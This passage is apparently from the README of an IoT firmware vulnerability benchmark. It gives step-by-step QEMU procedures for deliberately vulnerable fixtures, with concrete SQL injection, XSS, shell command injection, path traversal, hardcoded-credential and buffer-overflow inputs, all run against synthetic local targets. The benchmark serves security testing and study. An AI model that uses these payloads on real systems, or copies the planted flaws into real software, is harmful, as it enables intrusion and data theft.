this package. Replace `router` with any [device keyword](#device-keywords) to
build the same variant for another supported device profile.

**Boot — host:**

```bash
FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

At the serial console, log in as `root` with password `routeradmin`. Run all
remaining commands in the **guest**. This is a local filesystem fixture; no
Python command or test-runner script is used.

**Manual test — guest:**

1. Inspect the leaked file and native consumer:

   ```sh
   FIXTURE_ROOT=/usr/share/iotbench/password-leak/conf-password
   stat -c '%U:%G %a %n' "$FIXTURE_ROOT/auth.conf" "$FIXTURE_ROOT/fixture-auth"
   cat "$FIXTURE_ROOT/auth.conf"
   ```

   Expected: `auth.conf` is `root:root 644`, `fixture-auth` is
   `root:root 755`, and the file contains `password=FIXTURE_PASSWORD_001`.

2. Send a normal incorrect candidate:

   ```sh
   printf '%s\n' 'wrong-value' | "$FIXTURE_ROOT/fixture-auth" --isolated-fixture
   echo "baseline_exit=$?"
   ```

   Expected: `synthetic-auth: rejected` and `baseline_exit=1`.

3. Use the concrete credential recovered from the installed file:

   ```sh
   printf '%s\n' 'FIXTURE_PASSWORD_001' | "$FIXTURE_ROOT/fixture-auth" --isolated-fixture
   echo "recovered_exit=$?"
   ```

   Expected: `synthetic-auth: accepted` and `recovered_exit=0`.

4. Confirm that the consumer requires that source file, then restore it
   immediately:

   ```sh
   mv "$FIXTURE_ROOT/auth.conf" "$FIXTURE_ROOT/auth.conf.off"
   printf '%s\n' 'FIXTURE_PASSWORD_001' | "$FIXTURE_ROOT/fixture-auth" --isolated-fixture
   echo "source_control_exit=$?"
   mv "$FIXTURE_ROOT/auth.conf.off" "$FIXTURE_ROOT/auth.conf"
   ```

   Expected while the file is absent: `synthetic-auth: unavailable` and
   `source_control_exit=77`. The final `mv` restores the current guest; the
   disposable QEMU snapshot also discards the temporary rename.

5. Repeat the recovered candidate after restoration:

   ```sh
   printf '%s\n' 'FIXTURE_PASSWORD_001' | "$FIXTURE_ROOT/fixture-auth" --isolated-fixture
   echo "repeat_exit=$?"
   ```

   Expected: `synthetic-auth: accepted` and `repeat_exit=0`.

**Concrete Base64 pattern — optional second manual image:**

Build and boot a second, reversible representation:

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe798-password-leak-env-base64
TEST_FIRMWARE="$TEST_DEVICE-$TEST_SCENARIO"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm \
  -e IOTBENCH_BUILD_MODE=fixture \
  -e IOTBENCH_ENABLE_PASSWORD_LEAK_FIXTURE=1 yocto
FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

After the normal guest login, run:

```sh
FIXTURE_ROOT=/usr/share/iotbench/password-leak/env-base64
cat "$FIXTURE_ROOT/encoded.env"
printf '%s\n' 'wrong-value' | "$FIXTURE_ROOT/fixture-auth" --isolated-fixture
echo "baseline_exit=$?"
printf '%s\n' 'FIXTURE_ENCODED_PASSWORD_001' | "$FIXTURE_ROOT/fixture-auth" --isolated-fixture
echo "recovered_exit=$?"
```

Expected: `encoded.env` contains
`PASSWORD_B64="RklYVFVSRV9FTkNPREVEX1BBU1NXT1JEXzAwMQ=="`; the wrong candidate
is rejected with exit `1` and the decoded synthetic value is accepted with
exit `0`. The native consumer performs Base64 decoding itself.

### Scenario and scope

**⚙️ Implementation.** The 15 variants cover `.conf`, `.cfg`, `.ini`, `.env`,
`.json`, `.xml`, shell, C/header, properties, init, log and text patterns;
`json-base64` and `env-base64` are the encoded forms. Each of the eleven device
profiles has one image per variant (165 recipes). The selected image contains
exactly one credential-bearing source file under
`/usr/share/iotbench/password-leak/<variant>/`. Its `fixture-auth` ELF reads
that file through installed metadata, handles key-value, INI, JSON, XML or
C-literal syntax, and internally decodes Base64. Build and rootfs guards
require fixture mode, one variant, ordinary root-owned permissions, the native
helper, and no duplicate credential in that helper.

**✅ Verification.** Evidence requires the installed source file, rejected
wrong input, accepted recovered input, the temporary-source control returning
`77`, and repeated acceptance after restoration. The separate `env-base64`
image confirms an encoded representation reaches the same native path.

> ⚠️ **Disclaimer:** Intentionally insecure lab fixture; not for deployment.
> It demonstrates a recoverable synthetic credential in firmware files
> (**CWE-798**), not a real OS account, external authentication, remote access,
> command execution, or persistence.

Source: [cwe798-password-leak](../meta-iotbench/recipes-vulns/cwe798-password-leak/).

<a id="exploitable-rest-interface--internal-files-cwe-22cwe-73"></a>
<a id="test-7"></a>

## Test 7: Exploitable REST interface — internal files — CWE-22/CWE-73

### Build, boot and manual testing

**What this tests.** A native HTTP-style REST service reads a requested file
under its intended `fs/api/` directory. On the vulnerable configuration route,
the client-controlled `file` value is concatenated without enforcing that
directory boundary, so a concrete `../restricted/marker.txt` value reads a
real internal synthetic file. The socket and all files remain inside the guest.

**Build — host:**

Run from the repository root:

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe022-rest-internal-files
TEST_FIRMWARE="$TEST_DEVICE-$TEST_SCENARIO"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
```

The selected scenario enables its required fixture build mode and opt-in through
the existing builder. It exports the image under
`deploy-images/router-cwe022-rest-internal-files/qemuarm64/`. Replace `router`
with any [device keyword](#device-keywords) to build the same fixture for a
different supported device profile.

**Boot — host:**

```bash
FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

At the serial console, log in as `root` with password `routeradmin`. Run all
remaining commands in the **guest**. The service has no TCP or UDP listener:
the REST request travels only through a guest Unix-domain socket, so do not use
a browser or a host URL.

**Manual test — guest:**

1. Start the intentionally vulnerable server and confirm its private socket:

   ```sh
   REST_ROOT=/usr/share/iotbench/rest-internal-files
   stat -c '%U:%G %a %n' "$REST_ROOT/bin/fixture-rest" "$REST_ROOT/run"
   cat "$REST_ROOT/fs/.fixture-test-only"
   rm -f "$REST_ROOT/run/rest.sock" /tmp/iotbench-rest-vulnerable.log
   "$REST_ROOT/bin/fixture-rest" --isolated-fixture \
     > /tmp/iotbench-rest-vulnerable.log 2>&1 &
   REST_PID=$!
   sleep 1
   test -S "$REST_ROOT/run/rest.sock" && echo 'socket_ready=yes'
   ```

   Expected: the binary is `root:root 755`, `run` is `root:root 700`, the
   manifest says `mode=fixture` and `enabled=1`, and `socket_ready=yes` prints.

2. Send an in-bound baseline request:

   ```sh
   curl --path-as-is --unix-socket "$REST_ROOT/run/rest.sock" -sS -i \
     'http://fixture/api/config?file=config.cfg'
   echo "baseline_exit=$?"
   ```

   Expected: `HTTP/1.1 200 OK`, followed by
   `device=synthetic-fixture`, `profile=lab-only`, and `baseline_exit=0`.

3. Send the concrete boundary-crossing input and compare its response with the
   installed internal file:

   ```sh
   curl --path-as-is --unix-socket "$REST_ROOT/run/rest.sock" -sS -i \
     'http://fixture/api/config?file=%2e%2e%2frestricted%2fmarker.txt'
   echo "traversal_exit=$?"
   cat "$REST_ROOT/fs/restricted/marker.txt"
   cat /tmp/iotbench-rest-vulnerable.log
   ```

   Expected: `HTTP/1.1 200 OK`,
   `IOTBENCH_SYNTHETIC_REST_BOUNDARY_MARKER`, and `traversal_exit=0`. The
   marker printed by `cat` must match the REST response. The log must contain
   `fixture-read path=api/../restricted/marker.txt result=opened`, establishing
   that the response came from the internal file rather than a fixed response.
   Run the same `curl` command once more without changing the guest: it must
   again return `200` and the marker.

4. Replace the vulnerable process with the installed secure control and submit
   the identical input:

   ```sh
   kill "$REST_PID"
   wait "$REST_PID" 2>/dev/null || true
   rm -f "$REST_ROOT/run/rest.sock"
   "$REST_ROOT/bin/fixture-rest-secure" --isolated-fixture \
     > /tmp/iotbench-rest-secure.log 2>&1 &
   SECURE_PID=$!
   sleep 1
   curl --path-as-is --unix-socket "$REST_ROOT/run/rest.sock" -sS -i \
     'http://fixture/api/config?file=%2e%2e%2frestricted%2fmarker.txt'
   echo "secure_control_exit=$?"
   cat /tmp/iotbench-rest-secure.log
   kill "$SECURE_PID"
   wait "$SECURE_PID" 2>/dev/null || true
   rm -f "$REST_ROOT/run/rest.sock"
   ```

   Expected: `HTTP/1.1 403 Forbidden`, `file unavailable`, and
   `secure_control_exit=0`. The secure log contains only its readiness line;
   it must not report opening the restricted path. The QEMU snapshot discards
   the two temporary log files on exit.

### Scenario and scope

**⚙️ Implementation.** Each of the eleven
`<device>-cwe022-rest-internal-files` images installs only
`cwe022-rest-internal-files` as its vulnerability package. The vulnerable
route decodes the `file` query parameter, constructs `api/<file>`, and opens it
read-only with `openat2` relative to the fixture's `fs/` directory. The
intentional missing check is the `api/`-directory boundary: `api/../restricted/marker.txt`
therefore resolves to the installed synthetic marker. The kernel confinement
still prevents traversal outside `fs/`; no arbitrary guest or host file is
reachable. The separate `fixture-rest-secure` binary permits only a basename.

**✅ Verification.** The rebuilt `router` `qemuarm64` image was manually
checked with the commands above: the ordinary configuration read returned 200,
the concrete traversal returned the exact marker and an `opened` log entry, the
same request to the secure control returned 403, and a repeated vulnerable
request returned the same marker. These checks exercise HTTP parsing, file
opening and response construction in the built guest binary.

> ⚠️ **Disclaimer:** Intentionally insecure lab fixture; not for deployment.
> It demonstrates a controlled **CWE-22/CWE-73** path-boundary failure, not
> arbitrary file read, external network access, file modification, command
> execution, remote access, or persistence.

Source: [cwe022-rest-internal-files](../meta-iotbench/recipes-vulns/cwe022-rest-internal-files/).

<a id="exploitable-apache-application-fixtures"></a>
<a id="test-8"></a>

## Test 8: Apache web applications — CWE-89, CWE-79, CWE-20, CWE-352, CWE-78, CWE-22, CWE-77, CWE-306, CWE-862, CWE-287

### Build, boot and manual testing

**What this tests.** Each image contains a real Apache CGI application with
one selected, intentionally vulnerable web flow. The selected flow runs only
inside a disposable user/mount/network/PID namespace on guest loopback. Apache
does not start at boot and QEMU receives no NIC or host port-forwarding.

There are ten variants for each of the eleven device profiles. Build and boot
one variant at a time; the other nine application routes are absent from that
image.

| CWE | Firmware scenario |
| --- | --- |
| CWE-89 | `cwe089-apache-web` |
| CWE-79 | `cwe079-apache-web` |
| CWE-20 | `cwe020-apache-web` |
| CWE-352 | `cwe352-apache-web` |
| CWE-78 | `cwe078-apache-web` |
| CWE-22 | `cwe022-apache-web` |
| CWE-77 | `cwe077-apache-web` |
| CWE-306 | `cwe306-apache-web` |
| CWE-862 | `cwe862-apache-web` |
| CWE-287 | `cwe287-apache-web` |

**Build and boot — host:**

For example, to exercise the CWE-89 router image, run from the repository
root:

```bash
FIRMWARE=router-cwe089-apache-web docker compose run --rm yocto
FIRMWARE=router-cwe089-apache-web ./scripts/run-qemu.sh
```

Replace only `router-cwe089-apache-web` with one literal firmware ID from the
table above, using any supported device keyword. Wait for `login:` and sign in
as `root` with password `routeradmin`. All remaining commands run in the guest
serial console. Do not use a host URL: this image has no guest network device.

**Start the selected fixture — guest:**

```sh
rm -f /tmp/iotbench-apache.log
su -s /bin/sh -c 'cd /usr/share/iotbench/apache-fixture && ./manual-launch.sh --isolated-fixture > /tmp/iotbench-apache.log 2>&1 &' iotapache
until grep -q '^manual-apache-ready' /tmp/iotbench-apache.log; do sleep 1; done
cat /tmp/iotbench-apache.log
FIXTURE_PID=$(sed -n 's/^manual-launch-pid=//p' /tmp/iotbench-apache.log | tail -n 1)
```

Expected: `manual-apache-ready variant=CWE-... uid=1000`. The launcher only
stages fixed package files and starts Apache; it sends no HTTP request and makes
no assertion. `FIXTURE_PID` identifies its private network namespace.

The following login establishes a disposable admin session for CWE-89, CWE-79,
CWE-20, CWE-352, CWE-78, CWE-22 and CWE-77. It is not needed for CWE-306, and
CWE-862 and CWE-287 have their own commands below.

```sh
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 \
  -D /tmp/apache-login.headers -o /tmp/apache-login.json \
  -X POST -H 'Origin: http://127.0.0.1:18080' \
  --data-urlencode 'identity=admin' \
  --data-urlencode 'proof=fixture-admin-proof' \
  http://127.0.0.1:18080/app/login
SESSION=$(sed -n 's/^Set-Cookie: fixture_session=\([^;]*\).*/fixture_session=\1/p' /tmp/apache-login.headers | tr -d '\r')
CSRF=$(sed -n 's/.*"csrf": "\([^"]*\)".*/\1/p' /tmp/apache-login.json)
sed -n '1p' /tmp/apache-login.headers
cat /tmp/apache-login.json
```

Expected: HTTP 200, an `identity` of `admin`, and nonempty `SESSION` and `CSRF`
values. They are random per launcher invocation.

**Manual cases — guest:**

Run the two commands for the image selected at build time. The first is the
ordinary baseline where useful; the second is the concrete input that reaches
the intended condition.

**CWE-89 — SQL query construction.**

```sh
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
  --cookie "$SESSION" --data-urlencode 'name=public' \
  http://127.0.0.1:18080/app/query
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
  --cookie "$SESSION" --data-urlencode "name=' OR designated=1 --" \
  http://127.0.0.1:18080/app/query
```

Expected: the baseline returns `synthetic-public-record`; the second response
returns `synthetic-sql-sentinel`. The database is read-only, so this is a
bounded query-result witness rather than a database modification.

**CWE-79 — reflected HTML.**

```sh
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
  --cookie "$SESSION" --data-urlencode 'message=ordinary' \
  http://127.0.0.1:18080/app/reflect
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
  --cookie "$SESSION" \
  --data-urlencode 'message=<script>document.body.dataset.fixture="xss-marker"</script>' \
  http://127.0.0.1:18080/app/reflect
```

Expected: the first response contains `<main>ordinary</main>`; the second
contains the literal unencoded `<script>` element inside `main`. The terminal
test observes the missing output encoding; it deliberately does not execute a
browser payload.

**CWE-20 — missing numeric upper bound.**

```sh
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
  --data-urlencode "csrf=$CSRF" --data-urlencode 'level=100' \
  http://127.0.0.1:18080/app/level
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
  --data-urlencode "csrf=$CSRF" --data-urlencode 'level=101' \
  http://127.0.0.1:18080/app/level
```

Expected: the first response reports `"level": 100` and
the second reports `"level": 101`, although the fixture contract is 0 through
100 inclusive.

**CWE-352 — missing CSRF decision.**

```sh
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
  --data-urlencode 'value=ordinary' \
  http://127.0.0.1:18080/app/setting
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
  -H 'Origin: http://127.0.0.1:18081' --cookie "$SESSION" \
  --data-urlencode 'value=csrf-marker' \
  http://127.0.0.1:18080/app/setting
```

Expected: the first response contains `"value": "ordinary"`. The second has
the local second-origin header and no CSRF token, but still returns
`"value": "csrf-marker"`.

**CWE-78 — shell command construction.**

```sh
HTTPD_PID=$(pidof httpd | awk '{print $1}')
nsenter -t "$HTTPD_PID" -m -- /usr/bin/cat /state/shell.marker 2>/dev/null || echo 'shell-marker=absent'
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
  --data-urlencode "csrf=$CSRF" --data-urlencode 'label=ordinary' \
  http://127.0.0.1:18080/app/diagnostic
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
  --data-urlencode "csrf=$CSRF" \
  --data-urlencode 'label=ordinary; printf shell-marker > shell.marker; #' \
  http://127.0.0.1:18080/app/diagnostic
nsenter -t "$HTTPD_PID" -m -- /usr/bin/cat /state/shell.marker
```

Expected: both requests report `"ran": true`; the final command prints
`shell-marker`. The file is a tmpfs marker inside the private fixture mount,
not a guest or host file.

**CWE-22 — allowed-directory escape.**

```sh
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
  --cookie "$SESSION" --data-urlencode 'file=public.txt' \
  http://127.0.0.1:18080/app/file
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
  --cookie "$SESSION" --data-urlencode 'file=../sentinel.txt' \
  http://127.0.0.1:18080/app/file
```

Expected: the baseline returns `synthetic-public`; the second response returns
`synthetic-traversal-sentinel`, which exists only in the fixture state tree.

**CWE-77 — application command interpreter.**

```sh
HTTPD_PID=$(pidof httpd | awk '{print $1}')
nsenter -t "$HTTPD_PID" -m -- /usr/bin/cat /state/interpreter.marker 2>/dev/null || echo 'interpreter-marker=absent'
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
  --data-urlencode "csrf=$CSRF" --data-urlencode 'label=ordinary' \
  http://127.0.0.1:18080/app/command
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
  --data-urlencode "csrf=$CSRF" --data-urlencode 'label=ordinary; MARK' \
  http://127.0.0.1:18080/app/command
nsenter -t "$HTTPD_PID" -m -- /usr/bin/cat /state/interpreter.marker
```

Expected: the first response shows `ordinary`; the second prints
`application-command-marker`. This variant invokes only the synthetic
application grammar, not an operating-system shell.

**CWE-306 — critical write without authentication.**

```sh
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
  --data-urlencode 'value=ordinary' \
  http://127.0.0.1:18080/app/critical
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
  --data-urlencode 'value=unauthenticated-marker' \
  http://127.0.0.1:18080/app/critical
```

Expected: the first response contains `"value": "ordinary"`; the second
contains `"value": "unauthenticated-marker"`, without any cookie or login.

**CWE-862 — authenticated reader changes an admin setting.**

```sh
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -o /dev/null -w '%{http_code}\n' \
  -X POST --data-urlencode 'csrf=arbitrary' --data-urlencode 'value=ordinary' \
  http://127.0.0.1:18080/app/admin-setting
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 \
  -D /tmp/apache-reader.headers -o /tmp/apache-reader.json \
  -X POST -H 'Origin: http://127.0.0.1:18080' \
  --data-urlencode 'identity=reader' \
  --data-urlencode 'proof=fixture-reader-proof' \
  http://127.0.0.1:18080/app/login
READER_SESSION=$(sed -n 's/^Set-Cookie: fixture_session=\([^;]*\).*/fixture_session=\1/p' /tmp/apache-reader.headers | tr -d '\r')
READER_CSRF=$(sed -n 's/.*"csrf": "\([^"]*\)".*/\1/p' /tmp/apache-reader.json)
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
  -H 'Origin: http://127.0.0.1:18080' --cookie "$READER_SESSION" \
  --data-urlencode "csrf=$READER_CSRF" --data-urlencode 'value=reader-marker' \
  http://127.0.0.1:18080/app/admin-setting
```

Expected: the first command prints `401`; the reader login succeeds; the final
response returns `"value": "reader-marker"` even though the session role is
not admin.

**CWE-287 — truncated proof comparison.**

```sh
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -o /dev/null -w '%{http_code}\n' \
  -X POST -H 'Origin: http://127.0.0.1:18080' \
  --data-urlencode 'identity=admin' --data-urlencode 'proof=wrong' \
  http://127.0.0.1:18080/app/login
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 \
  -D /tmp/apache-forged.headers -o /tmp/apache-forged.json -w '%{http_code}\n' \
  -X POST -H 'Origin: http://127.0.0.1:18080' \
  --data-urlencode 'identity=admin' --data-urlencode 'proof=fixture-INVALID' \
  http://127.0.0.1:18080/app/login
FORGED_SESSION=$(sed -n 's/^Set-Cookie: fixture_session=\([^;]*\).*/fixture_session=\1/p' /tmp/apache-forged.headers | tr -d '\r')
nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
  --cookie "$FORGED_SESSION" http://127.0.0.1:18080/app/identity
```

Expected: the baseline prints `401`; the second login prints `200` and the final
response is `{"accepted_identity": "admin"}`. The supplied proof only
shares the first eight characters with the synthetic admin proof.

Stop the fixture before booting another variant:

```sh
kill "$FIXTURE_PID"
wait "$FIXTURE_PID" 2>/dev/null || true
```

The volatile staging directory and all sessions, databases and marker files are
removed when the fixture exits; a QEMU snapshot discards the outer guest files.

### Scenario and scope

**⚙️ Implementation.** Every `<device>-cweNNN-apache-web` image selects exactly
one `scenario.py` from `apache-web-fixture`; image guards reject a second
fixture package. `manual-launch.sh` reuses the package's namespace launcher,
starts Apache as UID 1000 with private loopback only, and provides fixed
synthetic SQLite/filesystem state. The `curl` commands above are the only HTTP
inputs: no host service, external address, production credential, persistence
or post-exploitation path is involved.

**✅ Runtime evidence.** All ten rebuilt `router` `qemuarm64` variants were
manually exercised through their guest serial consoles with the commands above.
The observed witnesses were, respectively: SQL sentinel (89), literal script
reflection (79), level `101` (20), `csrf-marker` from port 18081 (352),
`shell-marker` (78), traversal sentinel (22),
`application-command-marker` (77), unauthenticated marker (306), reader
marker after a 401 unauthenticated baseline (862), and an accepted `admin`
identity after the truncated-proof login (287). Each run used QEMU without a
NIC and a new disposable fixture state.

> ⚠️ **Disclaimer:** Intentionally insecure, isolated benchmark fixtures only.
> Apache listens solely on the fixture's private loopback interface; QEMU has no
> NIC for these images. Do not deploy this configuration or reuse its synthetic
> inputs outside this benchmark.

Source: [apache-web-fixture](../meta-iotbench/recipes-vulns/apache-web-fixture/).

<a id="vulnerable-c-binaries--path-traversal-and-filename-validation-cwe-22cwe-20"></a>
<a id="test-9"></a>

## Test 9: Vulnerable C binaries — path traversal and filename validation — CWE-22/CWE-20

### Build, boot and manual testing

**What this tests.** These images run the actual AArch64 C binary in a fresh,
unprivileged mount namespace. Each request copies the installed fixture into
that namespace, so the observed marker can only come from its synthetic
filesystem. The commands below are manual terminal commands; they do not use a
client script or Python.

**CWE-22 build and boot — host:**

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe022-native-path-traversal
TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

Log in on the serial console as `root` (password `routeradmin`). The named
scenario enables its fixture configuration automatically.

**CWE-22 baseline — guest:**

```sh
su -s /bin/sh iotpath -c '
root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" public.cfg
status=$?
rmdir "$root"
exit "$status"
'
echo "baseline_exit=$?"
```

Expected: `OK 32`, followed by `SYNTHETIC_ALLOWED_CONFIGURATION`, and
`baseline_exit=0`.

**CWE-22 traversal, containment control, and repeat — guest:**

```sh
cat /usr/share/iotbench/native-path/fs/sentinel.txt
su -s /bin/sh iotpath -c '
root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" ../sentinel.txt
status=$?
rmdir "$root"
exit "$status"
'
echo "traversal_exit=$?"

su -s /bin/sh iotpath -c '
root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" ../../etc/passwd
status=$?
rmdir "$root"
exit "$status"
'
echo "containment_exit=$?"

su -s /bin/sh iotpath -c '
root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" ../sentinel.txt
status=$?
rmdir "$root"
exit "$status"
'
echo "repeat_exit=$?"
```

Expected: the first command prints `SYNTHETIC_CWE22_SENTINEL_ONLY`. Both
`../sentinel.txt` requests return `OK 30` and that same marker with exit `0`:
the C code prefixes the input with `allowed/`, so `..` escapes only the
synthetic `allowed` directory. The `../../etc/passwd` control returns
`ERR DENIED` (and `containment_exit=0`, because the fixture handled the denied
request); it cannot leave the outer synthetic `/fixture/fs` root.

Shut down the guest (`poweroff`) before booting the second image.

**CWE-20 build and boot — host:**

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe020-native-filename-validation
TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"

FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

Log in again as `root` with password `routeradmin`.

**CWE-20 baseline, rejected control, bypass, and repeat — guest:**

```sh
cat /usr/share/iotbench/native-path/fs/allowed/private.cfg.bak

su -s /bin/sh iotpath -c '
root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" public.cfg
status=$?
rmdir "$root"
exit "$status"
'
echo "baseline_exit=$?"

su -s /bin/sh iotpath -c '
root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" private.bak
status=$?
rmdir "$root"
exit "$status"
'
echo "rejected_control_exit=$?"

su -s /bin/sh iotpath -c '
root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" private.cfg.bak
status=$?
rmdir "$root"
exit "$status"
'
echo "filename_bypass_exit=$?"

su -s /bin/sh iotpath -c '
root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" private.cfg.bak
status=$?
rmdir "$root"
exit "$status"
'
echo "repeat_exit=$?"
```

Expected: the initial `cat` prints `SYNTHETIC_CWE20_DISALLOWED_BACKUP`.
`public.cfg` returns `OK 32` and `SYNTHETIC_ALLOWED_CONFIGURATION`;
`private.bak` returns `ERR DENIED` with `rejected_control_exit=0`. Both
`private.cfg.bak` requests return `OK 34` and
`SYNTHETIC_CWE20_DISALLOWED_BACKUP` with exit `0`. The C
filename check accepts the `.cfg` prefix but does not require it to be the
end of the name, so it reads the otherwise disallowed synthetic backup.

### Scenario and scope

**⚙️ Implementation.** The same two thin image recipes exist for every listed
device category. The manual entry invokes the installed `isolate-path` and the
same `retrieve()` sink used by the package; it makes no listener, host mount,
or network request. The normal fixture ELF is static PIE so it remains
executable after the launcher pivots into its temporary root.

**✅ Runtime evidence.** On `router`/`qemuarm64`, both final exports were built
with the normal Compose workflow and manually exercised through QEMU's serial
console. CWE-22 produced the allowed baseline, the synthetic sentinel through
`../sentinel.txt`, an `ERR DENIED` outer-boundary control, and the same sentinel
on repetition. CWE-20 produced its allowed baseline, rejected `private.bak`,
read the synthetic backup through `private.cfg.bak`, and repeated that result.
The runtime evidence is limited to this built router/QEMU variant; the shared
recipes provide the corresponding fixture for the other device categories.

> ⚠️ **Disclaimer:** Intentionally insecure, isolated benchmark fixtures only.
> The requested files are synthetic and copied into a disposable namespace; do
> not deploy these inputs or configurations outside this benchmark.

Source: [native-path-fixture](../meta-iotbench/recipes-vulns/native-path-fixture/).

<a id="native-c-buffer-overflow-cwe-787-cwe-20-cwe-119"></a>
<a id="test-10"></a>

## Test 10: Vulnerable C binaries — buffer overflow — CWE-787/CWE-20/CWE-119

### Build, boot and manual testing

**What this tests.** The actual native AArch64 fixture accepts an exact binary
stdin frame: a two-byte big-endian length followed by printable bytes. It
validates the transport length only (maximum 256), then copies that many bytes
into a 64-byte global configuration array. This manual procedure uses the
ASan companion from the built firmware so the first out-of-bounds write is
observable without relying on undefined behavior from the normal ELF.

**Build — host:**

Run this from the repository root. `IOTBENCH_NATIVE_BUFFER_ASAN=1` installs
the diagnostic companion used below; the selected image enables its own fixture
mode and opt-in only.

```bash
TEST_DEVICE=router
TEST_SCENARIO=cwe787-native-buffer-overflow
TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"

docker compose run --rm \
  -e FIRMWARE="$TEST_FIRMWARE" \
  -e IOTBENCH_BUILD_MODE=fixture \
  -e IOTBENCH_ENABLE_NATIVE_BUFFER_FIXTURE=1 \
  -e IOTBENCH_NATIVE_BUFFER_ASAN=1 yocto
```

**Boot — host:**

```bash
FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
```

This serial-only fixture starts QEMU without a network device. Log in with
`root` / `routeradmin`; run the remaining commands in that guest console.

**64-byte baseline — guest:**

```sh
{ printf '\000\100'; printf '%064d' 0; } | \
  setpriv --reuid=65534 --regid=65534 --clear-groups --no-new-privs \
  env ASAN_OPTIONS='detect_leaks=0:halt_on_error=1:abort_on_error=0:symbolize=1:exitcode=86' \
  /usr/bin/fixture-buffer-write-asan
echo "baseline_exit=$?"
```

Expected: the fixture warning, then `OK 64 3072` and `baseline_exit=0`.
`\000\100` is the big-endian length `64`; `printf '%064d' 0` supplies exactly
64 printable `0` bytes. This is the safe boundary of the actual destination.

**65-byte witness — guest:**

```sh
{ printf '\000\101'; printf '%065d' 0; } | \
  setpriv --reuid=65534 --regid=65534 --clear-groups --no-new-privs \
  env ASAN_OPTIONS='detect_leaks=0:halt_on_error=1:abort_on_error=0:symbolize=1:exitcode=86' \
  /usr/bin/fixture-buffer-write-asan 2>/tmp/iotbench-cwe787-asan.log
echo "witness_exit=$?"
grep -E 'global-buffer-overflow|WRITE of size 1|fixture-buffer-write.c:51' \
  /tmp/iotbench-cwe787-asan.log
```

Expected: no normal `OK` line, `witness_exit=86`, and all three ASan witnesses:
`global-buffer-overflow`, `WRITE of size 1`, and
`fixture-buffer-write.c:51`. `\000\101` declares 65 printable `0` bytes: the
parser accepts the frame, while the 65th indexed store is the first write past
the 64-byte global array. Repeat this same 65-byte block once; it must again
exit `86` and report the same ASan class, write size, and source line.

### Scenario and scope

